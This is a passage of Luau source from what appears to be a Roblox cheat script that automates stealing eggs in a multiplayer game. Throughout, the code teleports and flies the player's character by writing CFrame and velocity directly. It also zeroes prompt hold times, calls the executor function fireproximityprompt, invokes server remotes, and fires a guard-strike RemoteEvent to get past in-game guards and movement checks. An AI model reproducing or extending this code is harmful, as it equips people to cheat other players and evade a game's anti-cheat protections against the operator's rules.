				if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
					return false
				end
				local waitTime = 0

				while waitTime < 1 do
					if shouldCancelSteal(sessionId) or chilliState.Steal.Carrying then
						return chilliState.Steal.Carrying == true
					end
					local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
					ok = ok and type(result) == "table" and result.Records or nil

					if type(ok) == "table" then
						local foundAvailable = false

						for _, record in pairs(ok) do
							if type(record) == "table" and record.Uid == eggUid and (record.State == "Slot" or record.State == "Dropped") then
								foundAvailable = true
								break
							end
						end

						if not foundAvailable then
							return chilliState.Steal.Carrying == true
						end
					end

					waitTime += task.wait(0.3)
				end

				return chilliState.Steal.Carrying == true
			end

			local function getDistanceToEgg(targetData)
				local rootPart = chilliState.Root()
				local targetPos = typeof(targetData.CFrame) == "CFrame" and targetData.CFrame.Position or nil
				if not rootPart or not targetPos then
					return math.huge
				end
				return (rootPart.Position - targetPos).Magnitude
			end

			getClosestTarget = function(targetsList)
				local bestDist = math.huge
				local bestTarget = nil

				for _, targetData in ipairs(targetsList) do
					local dist = getDistanceToEgg(targetData)

					if dist < bestDist then
						bestDist = dist
						bestTarget = targetData
					end
				end

				return bestTarget, bestDist
			end

			stealTargetMaxDist = 20
			stealBaseTweenSpeed = 90
			local stealJumpOffset = 6

			moveToTargetAndSteal = function(targetPos, sessionId, requireCarry, paceSpeed, enforceDistanceCheck, cancelCheckFunc)
				cleanupFlight()
				local rootPart = chilliState.Root()
				if not rootPart then
					return false
				end
				local character = localPlayer.Character
				local lastPos = rootPart.Position
				local startPos = lastPos
				local timeElapsed = 0
				local activePathParams = {}
				local currentPos = nil
				local ignoreStatus = nil
				local statusMsg = nil
				local activeIndex = 0

				local function hasPaceArg()
					if paceSpeed ~= nil then
						return true
					end
					return true
				end

				local function checkRootAndStatus(deltaTime)
					timeElapsed += deltaTime
					if shouldCancelSteal(sessionId) then
						ignoreStatus = false
						return nil
					end

					if requireCarry and not chilliState.Steal.Carrying then
						ignoreStatus = false
						statusMsg = "dropped"
						return nil
					end

					if cancelCheckFunc then
						local cancelReason = cancelCheckFunc()

						if cancelReason then
							ignoreStatus = false
							statusMsg = cancelReason
							return nil
						end
					end

					local currentRoot = chilliState.Root()

					if not currentRoot or timeElapsed >= 25 or localPlayer.Character ~= character then
						ignoreStatus = false
						statusMsg = "respawned"
						return nil
					end

					return currentRoot
				end

				local tweenHeartbeat = RunService.Heartbeat:Connect(function(deltaTime)
					if ignoreStatus ~= nil or hasPaceArg() or chilliState.AntiGuard.Busy then
						return
					end
					local currentRoot = checkRootAndStatus(deltaTime)
					if not currentRoot then
						return
					end

					if flightSpeed < (currentRoot.Position - currentPos).Magnitude then
						if enforceDistanceCheck then
							ignoreStatus = false
							statusMsg = "displaced"
							return
						end

						currentPos = currentRoot.Position
					end

					local baseSpeed = (paceSpeed or 400) * (os.clock() < (chilliState.SafeCarry.SlowUntil or 0) and chilliState.SafeCarry.SlowFactor or 1)
					local currentPace

					if chilliState.SafeCarry.Enabled and chilliState.SafeCarry.Pace then
						currentPace = math.min(baseSpeed, chilliState.SafeCarry.Pace())
					else
						currentPace = baseSpeed
					end

					local distanceVector = targetPos - currentPos
					local stepDistance = currentPace * deltaTime
					local hasReached = distanceVector.Magnitude <= math.max(stepDistance, 0.05)
					currentPos = hasReached and targetPos or currentPos + distanceVector.Unit * stepDistance
					local flatVector = Vector3.new(distanceVector.X, 0, distanceVector.Z)
					local rotationCFrame = flatVector.Magnitude > 0.05 and CFrame.lookAt(Vector3.zero, flatVector.Unit) or currentRoot.CFrame.Rotation

					pcall(function()
						currentRoot.CFrame = CFrame.new(currentPos) * rotationCFrame
						currentRoot.AssemblyLinearVelocity = Vector3.zero
						currentRoot.AssemblyAngularVelocity = Vector3.zero
					end)

					if hasReached then
						ignoreStatus = true
					end
				end)

				local tweenPreSim = RunService.PreSimulation:Connect(function(deltaTime)
					if ignoreStatus ~= nil or not hasPaceArg() or chilliState.AntiGuard.Busy then
						return
					end
					local currentRoot = checkRootAndStatus(deltaTime)
					if not currentRoot then
						return
					end
					local baseSpeed = (paceSpeed or 400) * (os.clock() < (chilliState.SafeCarry.SlowUntil or 0) and chilliState.SafeCarry.SlowFactor or 1)
					local currentPace

					if chilliState.SafeCarry.Enabled and chilliState.SafeCarry.Pace then
						currentPace = math.min(baseSpeed, chilliState.SafeCarry.Pace())
					else
						currentPace = baseSpeed
					end

					if enforceDistanceCheck and lastPos and (currentRoot.Position - lastPos).Magnitude > flightSpeed + currentPace * deltaTime then
						ignoreStatus = false
						statusMsg = "displaced"
						return
					end

					if calculateFlightVelocity(currentRoot, targetPos, currentPace, deltaTime, activePathParams) then
						ignoreStatus = true
					end

					lastPos = currentRoot.Position
					currentPos = currentRoot.Position
				end)

				while ignoreStatus == nil do
					RunService.Heartbeat:Wait()
				end

				tweenHeartbeat:Disconnect()
				tweenPreSim:Disconnect()

				if hasPaceArg() and not ignoreStatus then
					stopFlightVelocity()
				end

				if ignoreStatus then
					startFlightToTarget(targetPos, paceSpeed ~= nil)
				end

				return ignoreStatus, statusMsg
			end
			flyToPosition = moveToTargetAndSteal

			local baseLocations = {
				{
					Path = { "GearGiver_Slap", "Podium" },
					Offset = Vector3.new(-16.415, 21.072, -6.106),
				},
				{
					Path = { "World", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
				{
					Path = { "__OBJECTS", "Machines", "RiftMachine", "Rift", "Meshes/VoidPortal_Cube.003" },
					Offset = Vector3.new(-26.776, 1.75, 18.665),
				},
			}

			local getStealHomePos = function()
				for _, locData in ipairs(baseLocations) do
					local currentParent = workspace

					for _, pathName in ipairs(locData.Path) do
						currentParent = currentParent and currentParent:FindFirstChild(pathName) or nil
					end

					if currentParent and currentParent:IsA("BasePart") then
						return currentParent.CFrame:PointToWorldSpace(locData.Offset)
					end
				end

				return Vector3.new(528.7, 70.57, -364.11)
			end

			chilliState.StealHome = getStealHomePos

			chilliState.InsideBase = function(pos)
				if not pos then
					local rootPart = chilliState.Root()
					pos = rootPart and rootPart.Position
				end

				if pos == nil then
					return false
				end
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				local areas = world and world:FindFirstChild("Areas")
				local separationLine = areas and areas:FindFirstChild("SeparationLine")
				return pos.X < (separationLine and separationLine:IsA("BasePart") and separationLine.Position.X or 552)
			end

			local function pivotCharacterTo(pos)
				if chilliState.AntiGuard.Busy then
					return false
				end
				local character = localPlayer.Character
				local rootPart = chilliState.Root()
				if not character or not rootPart then
					return false
				end
				local rotation = rootPart.CFrame.Rotation
				local newCFrame = CFrame.new(pos) * rotation

				pcall(function()
					character:PivotTo(newCFrame)
				end)

				if (rootPart.Position - pos).Magnitude > 3 then
					pcall(function()
						rootPart.CFrame = newCFrame
					end)
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") then
						pcall(function()
							descendant.AssemblyLinearVelocity = Vector3.zero
							descendant.AssemblyAngularVelocity = Vector3.zero
						end)
					end
				end

				return true
			end

			local function teleportPartsToRoot(pos)
				if chilliState.AntiGuard.Busy then
					return
				end
				local character = localPlayer.Character
				local rootPart = chilliState.Root()
				if not character or not rootPart or not pos then
					return
				end

				if (rootPart.Position - pos).Magnitude > 6 then
					pivotCharacterTo(pos)
					return
				end

				for _, descendant in ipairs(character:GetDescendants()) do
					if descendant:IsA("BasePart") and descendant ~= rootPart and (descendant.Position - rootPart.Position).Magnitude > 12 then
						pcall(function()
							descendant.CFrame = rootPart.CFrame
							descendant.AssemblyLinearVelocity = Vector3.zero
						end)
					end
				end
			end

			local function teleportThroughRagdoll(sessionId, pos)
				local elapsedTime = 0

				while true do
					if not (elapsedTime < 6) then
						return not shouldCancelSteal(sessionId)
					else
						if shouldCancelSteal(sessionId) then
							break
						end
						local character = localPlayer.Character
						local isRagdolledFlag = isPlayerRagdolled()

						if not isRagdolledFlag and character then
							for _, descendant in ipairs(character:GetDescendants()) do
								if descendant:IsA("Constraint") and string.find(descendant.Name, "RagdollConstraint", 1, true) then
									isRagdolledFlag = true
									break
								end
							end
						end

						if not isRagdolledFlag then
							return not shouldCancelSteal(sessionId)
						end
						teleportPartsToRoot(pos)
						elapsedTime += RunService.Heartbeat:Wait()
					end
				end

				return false
			end

			local function findAreaGuard(targetData)
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("GuardAreas")
				local areaId = world and targetData and targetData.AreaId and world:FindFirstChild(targetData.AreaId)
				return areaId and areaId:FindFirstChild("Guard") or nil
			end

			local function isGuardSleeping(targetData)
				local guardPart = findAreaGuard(targetData)
				return guardPart ~= nil and guardPart:GetAttribute("GuardState") == "Sleeping"
			end

			local guardSafeRadius = 3

			local function getSafeBypassPos(targetData)
				local guardPart = findAreaGuard(targetData)
				local eggPos = typeof(targetData.CFrame) == "CFrame" and targetData.CFrame.Position or nil
				if not guardPart or not eggPos then
					return nil, nil
				end

				local ok, guardPos = pcall(function()
					return guardPart:GetPivot().Position
				end)

				if not ok then
					return nil, nil
				end
				local vector = Vector3.new(eggPos.X - guardPos.X, 0, eggPos.Z - guardPos.Z)
				if vector.Magnitude < 0.1 then
					return nil, nil
				end
				local offsetPos = guardPos + vector.Unit * guardSafeRadius
				return Vector3.new(offsetPos.X, eggPos.Y + 3, offsetPos.Z), guardPos
			end

			local function armAntiGuardHit(sessionId, destination)
				local hitState = { Landed = false, Destination = destination }
				local antiGuard = chilliState.AntiGuard
				antiGuard.HitArms = antiGuard.HitArms + 1
				chilliState.AntiGuard.HitArmedAt = os.clock()

				hitState.Link = localPlayer:GetAttributeChangedSignal("RagdollEndTime"):Connect(function()
					if hitState.Landed or shouldCancelSteal(sessionId) then
						return
					end
					local ragdollEndTime = tonumber(localPlayer:GetAttribute("RagdollEndTime"))
					if not ragdollEndTime or ragdollEndTime <= workspace:GetServerTimeNow() then
						return
					end
					local rootPart = chilliState.Root()
					if not rootPart then
						return
					end
					hitState.Landed = true
					cleanupFlight()
					chilliState.SafeCarry.JumpDistance = (hitState.Destination - rootPart.Position).Magnitude
					chilliState.SafeCarry.JumpAt = os.clock()

					pcall(function()
						rootPart.CFrame = CFrame.new(hitState.Destination)
						rootPart.AssemblyLinearVelocity = Vector3.zero
					end)
				end)

				hitState.Stop = function()
					if hitState.Link then
						hitState.Link:Disconnect()
						hitState.Link = nil
						chilliState.AntiGuard.HitArms = math.max(0, chilliState.AntiGuard.HitArms - 1)
					end
				end

				return hitState
			end

			local function waitAntiGuardLanded(sessionId, hitState, tickFunc)
				local character = localPlayer.Character
				character = character and character:FindFirstChildOfClass("Humanoid")

				if character then
					character.PlatformStand = false
				end

				local elapsed = 0
				local droppedTime = nil

				while not hitState.Landed and elapsed < 20 do
					if shouldCancelSteal(sessionId) then
						break
					end

					if tickFunc then
						tickFunc(hitState)
					end

					if not chilliState.Steal.Carrying then
						droppedTime = droppedTime or elapsed
						if elapsed - droppedTime > 1 then
							break
						end
					end

					elapsed += RunService.Heartbeat:Wait()
				end

				hitState.Stop()
				return hitState.Landed
			end

			local antiGuardWaitTime = 20

			local function antiGuardGrabEgg(targetData, sessionId, maxWait, tickFunc)
				local eggPos = typeof(targetData.CFrame) == "CFrame" and targetData.CFrame.Position or nil
				if not eggPos then
					return false
				end
				local elapsed = 0
				local promptWaitTime = math.huge

				while elapsed < maxWait do
					if shouldCancelSteal(sessionId) then
						return false
					end

					if chilliState.Steal.Carrying and not chilliState.Steal.WrongEgg(targetData.Uid) then
						return true
					end

					if promptWaitTime >= 0.1 then
						local eggPrompt = findClosestEggPrompt(targetData.Uid, eggPos)

						if eggPrompt then
							pcall(function()
								eggPrompt.HoldDuration = 0
							end)

							if typeof(fireproximityprompt) == "function" then
								pcall(fireproximityprompt, eggPrompt)
							end
						else
							sendCarryEggRequest(targetData.Uid)
						end

						promptWaitTime = 0
					end

					if tickFunc then
						teleportPartsToRoot(tickFunc)
					end

					local deltaTime = RunService.Heartbeat:Wait()
					elapsed += deltaTime
					promptWaitTime += deltaTime
				end

				return chilliState.Steal.Carrying == true
			end

			local function stealTargetEgg(targetData, sessionId, useAntiGuard, safeBypassPos)
				local eggPos = typeof(targetData.CFrame) == "CFrame" and targetData.CFrame.Position or nil
				if not eggPos then
					return false
				end
				local hoverPos = eggPos + Vector3.new(0, 3, 0)
				local character = localPlayer.Character
				local humanoid = character and character:FindFirstChildOfClass("Humanoid")

				if humanoid and character:FindFirstChildWhichIsA("Tool") then
					pcall(function()
						humanoid:UnequipTools()
					end)
				end

				if useAntiGuard then
					startFlightToTarget(hoverPos, true)
					actionStatus = "Waiting to stand up"
					if not teleportThroughRagdoll(sessionId, hoverPos) then
						return false
					end

					if chilliState.SafeCarry.Enabled and safeBypassPos == nil and chilliState.SafeCarry.Settle then
						if not chilliState.SafeCarry.Settle(sessionId, targetData) then
							return false
						end
					end
				else
					actionStatus = "Jumping to the egg"
					local rootPart = chilliState.Root()

					if rootPart and (hoverPos - rootPart.Position).Magnitude <= stealBaseTweenSpeed then
						pcall(function()
							local rotation = rootPart.CFrame.Rotation
							rootPart.CFrame = CFrame.new(hoverPos) * rotation
							rootPart.AssemblyLinearVelocity = Vector3.zero
							rootPart.AssemblyAngularVelocity = Vector3.zero
						end)
					elseif not moveToTargetAndSteal(hoverPos, sessionId, nil, 400) then
						return false
					end
				end

				if shouldCancelSteal(sessionId) then
					return false
				end
				local hasSafeBypass = safeBypassPos and typeof(safeBypassPos.CFrame) == "CFrame"
				local antiGuardHitState = nil

				if hasSafeBypass then
					antiGuardHitState = armAntiGuardHit(sessionId, safeBypassPos.CFrame.Position + Vector3.new(0, 3, 0))
				end

				local userIdStr = "FirstAreaEgg_" .. tostring(localPlayer.UserId)
				local starterSlot = type(targetData.Uid) == "string" and string.sub(targetData.Uid, 1, #userIdStr) == userIdStr and string.match(targetData.Uid, "_([%w ]+:Slot_%d+)$") or nil
				local isStarterEgg = safeBypassPos and starterSlot
				local grabbedSuccess = false

				if isStarterEgg then
					local eggStateModule = gameModules.EggState

					if type(eggStateModule) == "table" and type(eggStateModule.CarryFieldEgg) == "function" then
						actionStatus = "Taking the starter egg"

						task.spawn(function()
							pcall(eggStateModule.CarryFieldEgg, targetData.Uid, starterSlot)
						end)

						local waitTime = 0

						while not chilliState.Steal.Carrying and waitTime < 0.8 do
							if shouldCancelSteal(sessionId) then
								return false
							end
							waitTime += RunService.Heartbeat:Wait()
						end

						grabbedSuccess = chilliState.Steal.Carrying == true
					end
				end

				if not grabbedSuccess then
					actionStatus = "Taking the egg"
					grabbedSuccess = interactAndGrabEgg(targetData, sessionId)

					if not grabbedSuccess and not shouldCancelSteal(sessionId) then
						moveToTargetAndSteal(hoverPos, sessionId, nil, 400)
						grabbedSuccess = interactAndGrabEgg(targetData, sessionId)
					end
				end

				if not grabbedSuccess and not verifyEggAvailableFromServer(targetData.Uid, sessionId) then
					if antiGuardHitState then
						antiGuardHitState.Stop()
					end

					targetList[targetData.Uid] = os.clock() + stealCooldown
					actionStatus = "That egg would not come free"
					return false
				end

				if antiGuardHitState then
					local reGuardPatrolForestStrike = networking:FindFirstChild("RE/GuardPatrol/ForestStrike")
					local guardPart = findAreaGuard(targetData) or findAreaGuard({ AreaId = "Forest" })
					local guardRootPart = guardPart and guardPart:FindFirstChild("HumanoidRootPart")

					if reGuardPatrolForestStrike and reGuardPatrolForestStrike:IsA("RemoteEvent") and guardRootPart then
						actionStatus = "Calling the guard strike"

						pcall(function()
							reGuardPatrolForestStrike:FireServer({ EggUid = targetData.Uid, GuardCFrame = guardRootPart.CFrame })
						end)
					end
				end

				chilliState.Steal.LastFinishedAt = os.clock()
				return true, antiGuardHitState
			end

			local distTimeout = math.huge
			local waitTimeout = math.huge

			local function findEggPromptNearRoot(rootPos, searchRadius, ignoreUid)
				local bestPrompt = nil
				local bestPart = nil

				for _, child in ipairs(workspace:GetChildren()) do
					if child.Name == "SmartPromptPart" and child:IsA("BasePart") then
						local eggPrompt = child:FindFirstChild("CarryAreaEgg")

						if eggPrompt and eggPrompt:IsA("ProximityPrompt") then
							local magnitude = (child.Position - rootPos).Magnitude

							if magnitude < searchRadius then
								searchRadius = magnitude
								bestPrompt = eggPrompt
								bestPart = child
							end
						end
					end
				end

				if bestPrompt and bestPart and type(ignoreUid) == "string" and not checkEggIsClear(bestPart, ignoreUid, rootPos) then
					return nil
				end
				return bestPrompt, bestPart
			end

			local function getEggSlotPosition(eggUid)
				local areaEggSlotsClient = workspace:FindFirstChild("AreaEggSlotsClient")
				local slotModel = workspace:FindFirstChild(eggUid) or areaEggSlotsClient and areaEggSlotsClient:FindFirstChild(eggUid)
				if not slotModel then
					return nil
				end

				local ok, result = pcall(function()
					return slotModel:GetPivot().Position
				end)

				return ok and result or nil
			end

			local function fetchEggBottomCFrame(eggUid)
				local rfEggWorldAskFieldEggSnapshot = networking:FindFirstChild("RF/EggWorld/AskFieldEggSnapshot")
				if not rfEggWorldAskFieldEggSnapshot or not rfEggWorldAskFieldEggSnapshot:IsA("RemoteFunction") then
					return nil
				end
				local ok, result = pcall(rfEggWorldAskFieldEggSnapshot.InvokeServer, rfEggWorldAskFieldEggSnapshot)
				local records = ok and type(result) == "table" and result.Records or nil
				if type(records) ~= "table" then
					return nil
				end

				for _, record in pairs(records) do
					if type(record) == "table" and record.Uid == eggUid and typeof(record.BottomCFrame) == "CFrame" then
						return record.BottomCFrame.Position, true
					end
				end

				return nil, true
			end

			local function isEggCarriedByOther(eggUid)
				local eggModel = workspace:FindFirstChild(eggUid)
				if not eggModel then
					return false
				end

				for _, descendant in ipairs(eggModel:GetDescendants()) do
					if descendant:IsA("JointInstance") or descendant:IsA("WeldConstraint") or descendant:IsA("RigidConstraint") then
						local ok, part0, part1 = pcall(function()
							return descendant.Part0, descendant.Part1
						end)

						if ok then
							for _, jointPart in ipairs({ part0, part1 }) do
								if typeof(jointPart) == "Instance" and not jointPart:IsDescendantOf(eggModel) then
									local model = jointPart:FindFirstAncestorOfClass("Model")
									if model and model ~= localPlayer.Character and Players:GetPlayerFromCharacter(model) then
										return true
									end
								end
							end
						end
					end
				end

				return false
			end

			grabAndReturnToSafeZone = function(sessionIdArg, eggUidArg)
				local state = 1
				local sessionId, targetUid, targetPos, flightVelocity, flightConnection, timeElapsed, fetchRetries, timeSinceLastFetch, lastEggPos, lastEggTime, distanceToEgg, timeSinceLastPrompt, grabbedEgg, rootPart, slotPos, fetchedPos, fetchSuccess, now, canCalcVelocity, isCloseToEgg
				local slotVelocity, timeSinceLastDropCheck, bestPrompt

				while true do
					if state == 1 then
						sessionId = sessionIdArg
						targetUid = eggUidArg

						if targetUid then
							state = 3
						else
							state = 2
						end
					elseif state == 2 then
						targetUid = chilliState.Steal.CarryUid
						state = 3
					elseif state == 3 then
						if type(targetUid) ~= "string" then
							state = 50
						else
							state = 4
						end
					elseif state == 4 then
						stopFlightVelocity()
						actionStatus = "Following the egg"
						targetPos = nil
						flightVelocity = Vector3.zero

						flightConnection = RunService.PreSimulation:Connect(function(deltaTime)
							local currentRoot = chilliState.Root()
							if not currentRoot or not targetPos or chilliState.Steal.Carrying or shouldCancelSteal(sessionId) then
								return
							end

							if isPlayerRagdolled() then
								if not chilliState.SafeCarry.Enabled and (currentRoot.Position - targetPos).Magnitude > 2 then
									pivotCharacterTo(targetPos)
								end

								return
							end

							local dtClamped = math.max(deltaTime, 0.0041666666666666666)
							local velTarget = flightVelocity + (targetPos - currentRoot.Position) / math.max(0.08, dtClamped)
							local maxSpeed = chilliState.SafeCarry.Enabled and chilliState.SafeCarry.Pace() or (distanceMax or 400) + flightVelocity.Magnitude

							if velTarget.Magnitude > maxSpeed then
								velTarget = velTarget.Unit * maxSpeed
							end

							local assemblyLinearVelocity = velTarget + Vector3.new(0, workspace.Gravity * dtClamped * 0.5, 0)

							pcall(function()
								currentRoot.AssemblyLinearVelocity = assemblyLinearVelocity
								currentRoot.AssemblyAngularVelocity = Vector3.zero
							end)
						end)

						timeElapsed = 0
						fetchRetries = 0
						timeSinceLastFetch = math.huge
						lastEggPos = nil
						lastEggTime = nil
						distanceToEgg = 0
						timeSinceLastPrompt = math.huge
						state = 5
					elseif state == 5 then
						grabbedEgg = false

						if not (timeElapsed < waitTimeout) then
							state = 47
						else
							state = 6
						end
					elseif state == 6 then
						if shouldCancelSteal(sessionId) then
							state = 47
						else
							state = 7
						end
					elseif state == 7 then
						if chilliState.Steal.Carrying then
							state = 8
						else
							state = 11
						end
					elseif state == 8 then
						if chilliState.Steal.WrongEgg(targetUid) then
							state = 10
						else
							state = 9
						end
					elseif state == 9 then
						grabbedEgg = true
						state = 47
					elseif state == 10 then
						actionStatus = "Picked up the wrong egg, dropped it"
						state = 11
					elseif state == 11 then
						rootPart = chilliState.Root()

						if not rootPart then
							state = 47
						else
							state = 12
						end
					elseif state == 12 then
						slotPos = getEggSlotPosition(targetUid)

						if slotPos then
							state = 21
						else
							state = 13
						end
					elseif state == 13 then
						if timeSinceLastFetch >= 0.5 then
							state = 14
						else
							state = 22
						end
					elseif state == 14 then
						fetchedPos, fetchSuccess = fetchEggBottomCFrame(targetUid)

						if fetchedPos then
							state = 20
						else
							state = 15
						end
					elseif state == 15 then
						timeSinceLastFetch = 0

						if fetchSuccess then
							state = 17
						else
							state = 16
						end
					elseif state == 16 then
						slotPos = fetchedPos
						state = 22
					elseif state == 17 then
						fetchRetries += 1

						if not (fetchRetries >= 4) then
							state = 19
						else
							state = 18
						end
					elseif state == 18 then
						actionStatus = "The egg is gone"
						state = 47
					elseif state == 19 then
						slotPos = fetchedPos
						state = 22
					elseif state == 20 then
						fetchRetries = 0
						timeSinceLastFetch = 0
						slotPos = fetchedPos
						state = 22
					elseif state == 21 then
						fetchRetries = 0
						state = 22
					elseif state == 22 then
						if slotPos then
							state = 23
						else
							state = 32
						end
					elseif state == 23 then
						now = os.clock()

						if lastEggPos then
							state = 25
						else
							state = 24
						end
					elseif state == 24 then
						canCalcVelocity = lastEggPos
						state = 26
					elseif state == 25 then
						canCalcVelocity = lastEggTime
						state = 26
					elseif state == 26 then
						if canCalcVelocity then
							state = 27
						else
							state = 28
						end
					elseif state == 27 then
						canCalcVelocity = now > lastEggTime
						state = 28
					elseif state == 28 then
						if canCalcVelocity then
							state = 29
						else
							state = 31
						end
					elseif state == 29 then
						slotVelocity = (slotPos - lastEggPos) / math.max(now - lastEggTime, 0.0041666666666666666)

						if not (slotVelocity.Magnitude < 3000) then
							state = 31
						else
							state = 30
						end
					elseif state == 30 then
						flightVelocity = flightVelocity:Lerp(slotVelocity, 0.3)
						state = 31
					elseif state == 31 then
						targetPos = slotPos + Vector3.new(0, 3, 0)
						lastEggPos = slotPos
						lastEggTime = now
						state = 32
					elseif state == 32 then
						if not (timeSinceLastDropCheck >= 0.4) then
							state = 36
						else
							state = 33
						end
					elseif state == 33 then
						if isEggCarriedByOther(targetUid) then
							state = 35
						else
							state = 34
						end
					elseif state == 34 then
						actionStatus = "Egg dropped, taking it back"
						timeSinceLastDropCheck = 0
						state = 36
					elseif state == 35 then
						actionStatus = "Another player has the egg, following it until it drops"
						timeSinceLastDropCheck = 0
						state = 36
					elseif state == 36 then
						if targetPos then
							state = 38
						else
							state = 37
						end
					elseif state == 37 then
						isCloseToEgg = targetPos
						state = 39
					elseif state == 38 then
						isCloseToEgg = (targetPos - rootPart.Position).Magnitude <= 20
						state = 39
					elseif state == 39 then
						if isCloseToEgg then
							state = 40
						else
							state = 41
						end
					elseif state == 40 then
						isCloseToEgg = timeSinceLastPrompt >= 0.1
						state = 41
					elseif state == 41 then
						if isCloseToEgg then
							state = 42
						else
							state = 46
						end
					elseif state == 42 then
						bestPrompt = findEggPromptNearRoot(targetPos - Vector3.new(0, 3, 0), 6, targetUid)

						if bestPrompt then
							state = 44
						else
							state = 43
						end
					elseif state == 43 then
						task.spawn(sendCarryEggRequest, targetUid)
						timeSinceLastPrompt = 0
						state = 46
					elseif state == 44 then
						pcall(function()
							bestPrompt.HoldDuration = 0
						end)

						timeSinceLastPrompt = 0

						if typeof(fireproximityprompt) ~= "function" then
							state = 46
						else
							state = 45
						end
					elseif state == 45 then
						pcall(fireproximityprompt, bestPrompt)
						state = 46
					elseif state == 46 then
						local dt = RunService.Heartbeat:Wait()
						timeElapsed += dt
						timeSinceLastPrompt += dt
						timeSinceLastFetch += dt
						timeSinceLastDropCheck += dt
						state = 5
					elseif state == 47 then
						flightConnection:Disconnect()
						stopFlightVelocity()

						if grabbedEgg then
							state = 49
						else
							state = 48
						end
					elseif state == 48 then
						grabbedEgg = chilliState.Steal.Carrying == true
						state = 49
					elseif state == 49 then
						return grabbedEgg
					elseif state == 50 then
						return false
					end
				end
			end

			local function flyAndGrabEgg(targetData, sessionId)
				local eggPos = typeof(targetData.CFrame) == "CFrame" and targetData.CFrame.Position or nil
				if not eggPos then
					return false
				end

				if chilliState.InsideBase() and not chilliState.InsideBase(eggPos) then
					local homePos = getStealHomePos()

					if homePos then
						actionStatus = "Leaving the base through the safe zone"
						if not moveToTargetAndSteal(homePos + Vector3.new(0, 3, 0), sessionId, nil, 400) then
							return false
						end
					end
				end

				actionStatus = "Flying to the egg"
				if not moveToTargetAndSteal(eggPos + Vector3.new(0, 3, 0), sessionId, nil, 400) then
					return false
				end
				actionStatus = "Taking the egg"
				local grabbedSuccess = antiGuardGrabEgg(targetData, sessionId, 0.6, nil)

				if not grabbedSuccess and not shouldCancelSteal(sessionId) then
					grabbedSuccess = interactAndGrabEgg(targetData, sessionId)
				end

				if not grabbedSuccess and not verifyEggAvailableFromServer(targetData.Uid, sessionId) then
					targetList[targetData.Uid] = os.clock() + stealCooldown
					return false
				end
				chilliState.Steal.LastFinishedAt = os.clock()
				return true
			end
			local fn51 = flyAndGrabEgg

			local priorityFreedEgg = { Uid = nil, Freed = nil, Token = nil }
			local tbl20 = priorityFreedEgg
			local priorityArrivalMultiplier = 3
			local n16 = priorityArrivalMultiplier

			local function getClosestAreaGuard()
				local world = workspace:FindFirstChild("World") or workspace:FindFirstChild("__OBJECTS")
				world = world and world:FindFirstChild("Areas")
				world = world and world:FindFirstChild("GuardAreas")
				local rootPart = chilliState.Root()
				if not world or not rootPart then
					return nil
				end
				local userIdStr = tostring(localPlayer.UserId)
				local carryAreaId = chilliState.Steal.CarryAreaId and findAreaGuard({ AreaId = tostring(chilliState.Steal.CarryAreaId) }) or nil
				local closestDist = math.huge
				local closestGuard = nil

				for _, child in ipairs(world:GetChildren()) do
					local guard = child:FindFirstChild("Guard")

					if guard then
						if tostring(guard:GetAttribute("TargetPlayer")) == userIdStr or tostring(guard:GetAttribute("WakeTargetPlayer")) == userIdStr then
							return guard
						end

						local ok, guardPos = pcall(function()
							return guard:GetPivot().Position
						end)

						if ok and guardPos then
							local dist = (guardPos - rootPart.Position).Magnitude

							if dist < closestDist then
								closestGuard = guard
								closestDist = dist
							end
						end
					end
				end

				return carryAreaId or closestGuard
			end

			local function rideGuardHitToPosition(sessionId, eggUid, eggPos)
				local areaGuard = getClosestAreaGuard()
				if not areaGuard then
					return false
				end
				local hitState = armAntiGuardHit(sessionId, eggPos + Vector3.new(0, 3, 0))
				local waitTicks = 0

				while true do
					if not hitState.Landed and waitTicks < 20 and not shouldCancelSteal(sessionId) then
						local ok, guardPos = pcall(function()
							return areaGuard:GetPivot().Position
						end)

						local rootPart = chilliState.Root()

						if not (not ok or not rootPart) then
							if guardSafeRadius + 5 < (guardPos - rootPart.Position).Magnitude then
								local dirToRoot = Vector3.new(rootPart.Position.X - guardPos.X, 0, rootPart.Position.Z - guardPos.Z)
								local safePos = guardPos + (dirToRoot.Magnitude > 0.1 and dirToRoot.Unit * guardSafeRadius or Vector3.zero)

								moveToTargetAndSteal(Vector3.new(safePos.X, guardPos.Y + 3, safePos.Z), sessionId, nil, 400, true, function()
									if hitState.Landed then
										return "hit"
									end
									return nil
								end)
							end

							waitTicks += RunService.Heartbeat:Wait()
							continue
						end
					end

					break
				end

				hitState.Stop()
				if not hitState.Landed then
					return false
				end
				return grabAndReturnToSafeZone(sessionId, eggUid)
			end
			local stealEggWithGuardBypass = rideGuardHitToPosition
			local fn53 = rideGuardHitToPosition

			chilliState.SafeCarry.Dangers = {}
			chilliState.SafeCarry.DangerAt = 0

			chilliState.SafeCarry.RefreshDangers = function()
				local safeCarry = chilliState.SafeCarry
				local dangerAt = safeCarry.DangerAt
				if os.clock() - dangerAt < 1 then
					return safeCarry.Dangers
				end
				safeCarry.DangerAt = os.clock()
				local dangers = {}

				local function addDangerZone(instance)
					local ok, cframe, size = pcall(function()
						if instance:IsA("Model") then
							return instance:GetBoundingBox()
						end

						if instance:IsA("BasePart") then
							return instance.CFrame, instance.Size
						end
					end)

					if ok and cframe and size then
						local abs = math.abs
						local halfSize = Vector3.new(abs(size.X), 0, abs(size.Z)) * 0.5
						local rotatedHalfSize = (cframe - cframe.Position):VectorToWorldSpace(halfSize)
						local maxXOffset = math.max(abs(rotatedHalfSize.X), halfSize.X, halfSize.Z)
						local maxZOffset = math.max(abs(rotatedHalfSize.Z), halfSize.X, halfSize.Z)

						table.insert(dangers, {
							MinX = cframe.Position.X - maxXOffset,
							MaxX = cframe.Position.X + maxXOffset,
							MinZ = cframe.Position.Z - maxZOffset,
							MaxZ = cframe.Position.Z + maxZOffset,
							Name = instance.Name,
						})
					end
				end

				local function isDangerZone(name)
					if name == "ScrambleLocalVisuals" or name == "DrScrambleEvent" then
						return false
					end
					local lowerName = string.lower(name)
